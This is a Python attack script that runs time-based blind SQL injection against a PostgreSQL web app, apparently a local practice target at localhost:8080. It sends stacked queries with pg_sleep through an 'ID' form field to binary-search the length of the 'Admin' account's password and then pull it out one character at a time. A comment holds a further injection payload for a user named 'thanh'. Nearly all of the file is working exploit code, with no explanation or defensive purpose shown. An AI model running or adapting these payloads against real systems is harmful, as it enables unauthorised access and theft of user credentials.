import requests
import string
import locale
import time
# " and (select length(\"PassWord\") from public.\"user\" where \"UserName\"='thanh')={length}-- 
def time_check(url,data):
        start = time.time()
        r = requests.post(url=url,data=data)
        end = time.time()
        during = end-start
        if(during>8):
            return 0
        else:
            if(during>5):
                return 1
            else:
                return 2
def get_length(url):
    max_length=30
    left = 1
    mid = 1 
    while left<=max_length:
        mid = (max_length+left)//2
        data1 = {'ID':f"8';SELECT CASE WHEN (select length(\"PassWord\") from public.\"user\" where \"UserName\"='Admin')>{mid} THEN pg_sleep(7) ELSE pg_sleep(0) END--'"}
        data2 = {'ID':f"8';SELECT CASE WHEN (select length(\"PassWord\") from public.\"user\" where \"UserName\"='Admin')={mid} THEN pg_sleep(10) ELSE pg_sleep(0) END--'"}
        if(time_check(url,data2)==0):
            print(f'[+] Found length of password: {mid}')
            return mid
        else:
            if time_check(url, data1) == 1:
                left = mid + 1
            else:
                max_length = mid - 1
    return None
            
def exploit(url):
    length = get_length(url)
    wordlist = sorted(string.printable[:62])
    locale.setlocale(locale.LC_COLLATE, 'en_US.UTF-8')
    sorted_strings = sorted(wordlist, key=locale.strxfrm)
    password=""

    for i in range(1,length+1):
        max_length=len(wordlist)+1
        left = 1
        while left<=max_length:
            mid = (max_length+left)//2
            data1 = {'ID':f"8';SELECT CASE WHEN substr((select \"PassWord\" from public.\"user\" where \"UserName\"='Admin'),{i},1)='{sorted_strings[mid]}' THEN pg_sleep(10) ELSE pg_sleep(0) END--"}         
            data2 = {'ID':f"8';SELECT CASE WHEN substr((select \"PassWord\" from public.\"user\" where \"UserName\"='Admin'),{i},1)>'{sorted_strings[mid]}' THEN pg_sleep(7) ELSE pg_sleep(0) END--"}
            if(time_check(url,data1)==0):
                password += sorted_strings[mid]
                print(f'[+] Found char of password: {sorted_strings[mid]} --> Password: {password}')
                break
            else:
                if time_check(url, data2) == 1:
                    left = mid + 1
                else:
                    max_length = mid - 1

if __name__=="__main__":
    start = time.time()
    url = 'http://localhost:8080/T1/index'
    exploit(url=url)    
    end = time.time()
    during = end-start
    print(during)

   
#   mvn -N io.takari:maven:wrapper
# mvnw package docker:build
